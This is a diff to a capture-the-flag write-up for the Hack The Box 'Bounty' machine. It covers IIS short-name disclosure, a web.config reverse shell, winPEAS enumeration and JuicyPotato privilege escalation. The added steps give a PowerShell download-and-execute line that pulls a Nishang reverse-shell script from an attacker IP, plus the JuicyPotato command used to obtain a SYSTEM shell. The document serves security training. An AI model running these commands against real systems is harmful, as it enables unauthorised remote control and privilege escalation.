@@ -7,7 +7,7 @@ Info: Bounty is an easy to medium difficulty machine, which features an interest
 3. Tech Stack
 4. Shortname files/folders/directories IIS Vulnerability with tilde character
 5. Reverse Shell using web.config
-6. 
+6. SystemInfo
 
 
 
@@ -87,7 +87,7 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 Bit Weird. Now I dig up on HTB Forums and got a hint that I should look for IIS tilde character "~" vulnerability which is looking for a Short File Folder name disclosure.
 
 ---
-#### Lesson Learned
+#### Reminder 
 When you deal with IIS, do check for the short file/folder name disclosure using [IIS Short Name Scanner](https://github.com/irsdl/IIS-ShortName-Scanner/tree/master/release) and under the release directory run the following command and identify the short names of directories and files. Following to that you can use more specific wordlists using Gobuster or Burp's Spider/Crawler to enumerate directories.
 
 ---
@@ -219,4 +219,95 @@ bounty\merlin
 ```
 
 
+At this point, as tried in the previous boxes (devel, granny, Grandpa), the local_exploit_suggester did not show any of the exploits. Let's try out winPEAS.
 
+#### System Info 
+
+The following results were obtained after running winPEAS.bat on the target. The obtained shell was a powershell which has the script execution disabled. The user doesn't have a rights to enabled the script execution. Hence, I switched to cmd.exe and ran the .bat files.
+
+```
+Host Name:                 BOUNTY                                                                                                                       
+OS Name:                   Microsoft Windows Server 2008 R2 Datacenter                                                                                  
+OS Version:                6.1.7600 N/A Build 7600   
+Hotfix(s):                 N/A
+
+"Microsoft Windows Server 2008 R2 Datacenter "          
+   [i] Possible exploits (https://github.com/codingo/OSCP-2/blob/master/Windows/WinPrivCheck.bat)       
+MS11-080 patch is NOT installed XP/SP3,2K3/SP3-afd.sys) 
+MS16-032 patch is NOT installed 2K8/SP1/2,Vista/SP2,7/SP1-secondary logon)              
+MS11-011 patch is NOT installed XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP1/2,7/SP0-WmiTraceMessageVa)           
+MS10-59 patch is NOT installed 2K8,Vista,7/SP0-Chimichurri)             
+MS10-21 patch is NOT installed 2K/SP4,XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP0/1/2,7/SP0-Win Kernel)          
+MS10-092 patch is NOT installed 2K8/SP0/1/2,Vista/SP1/2,7/SP0-Task Sched)               
+MS10-073 patch is NOT installed XP/SP2/3,2K3/SP2/2K8/SP2,Vista/SP1/2,7/SP0-Keyboard Layout)             
+MS17-017 patch is NOT installed 2K8/SP2,Vista/SP2,7/SP1-Registry Hive Loading)          
+MS10-015 patch is NOT installed 2K,XP,2K3,2K8,Vista,7-User Mode to Ring)
+MS08-025 patch is NOT installed 2K/SP4,XP/SP2,2K3/SP1/2,2K8/SP0,Vista/SP0/1-win32k.sys) 
+MS06-049 patch is NOT installed 2K/SP4-ZwQuerySysInfo)  
+MS06-030 patch is NOT installed 2K,XP/SP2-Mrxsmb.sys)   
+MS05-055 patch is NOT installed 2K/SP4-APC Data-Free)   
+MS05-018 patch is NOT installed 2K/SP3/4,XP/SP1/2-CSRSS)
+MS04-019 patch is NOT installed 2K/SP2/3/4-Utility Manager)             
+MS04-011 patch is NOT installed 2K/SP2/3/4,XP/SP0/1-LSASS service BoF)  
+MS04-020 patch is NOT installed 2K/SP4-POSIX)           
+MS14-040 patch is NOT installed 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-afd.sys Dangling Pointer)               
+MS16-016 patch is NOT installed 2K8/SP1/2,Vista/SP2,7/SP1-WebDAV to Address)            
+MS15-051 patch is NOT installed 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-win32k.sys)             
+MS14-070 patch is NOT installed 2K3/SP2-TCP/IP)         
+MS13-005 patch is NOT installed Vista,7,8,2008,2008R2,2012,RT-hwnd_broadcast)           
+MS13-053 patch is NOT installed 7SP0/SP1_x86-schlamperei)               
+MS13-081 patch is NOT installed 7SP0/SP1_x86-track_popup_menu)
+
+PRIVILEGES INFORMATION  
+----------------------  
+Privilege NameDescription               State           
+============================= ========================================= ========        
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled        
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled        
+SeAuditPrivilege              Generate security audits                  Disabled        
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled         
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled         
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+```
+
+You can also just print the privileges using "whoami /priv" command.
+
+```
+PS C:\Users\merlin\Documents> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+```
+
+Since the SeImpersonatePrivilege is Enabled, We have couple of options. We have discussed this options in Granny.HTB as well. For this box, we are going to try out JuicyPoteto exploit.
+
+1. Download the Juicypoteto binary from [Link](https://github.com/ohpe/juicy-potato/releases/tag/v0.1) 
+2. Using Impacket-SmbServer transfer it to the target. Also, start the Python Web Server.
+3. Download the [Nishang PowerShell script](https://github.com/d4t4s3c/OffensiveReverseShellCheatSheet/blob/master/Invoke-PowerShellTcp.ps1) from Here and change the last line with your IP and Port 4444. Place this on in the same directory where the SMB Server and Python Web Server is running.
+4. Prepare a bat file on target machine with the following line
+```
+echo "powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.16.5:80/Invoke-PowerShellTcp.ps1')" > shell.bat
+```
+
+5. Download the batch script onto the target box using the command below.
+```
+(New-Object System.Net.WebClient).DownloadFile('http://10.10.16.5:80/shell.bat', 'C:\Users\merlin\Documents\shell.bat')
+```
+
+6. Check the [valid list of CLSID on this Link](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise/) 
+7. Start the Listener on port 4444
+8. Run the exploit with the following command
+```
+./JuicyPotato.exe -l 4444 -p C:\Users\merlin\Documents\shell.bat -t * -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}"
+```
+
+9. You should get the SYSTEM shell.
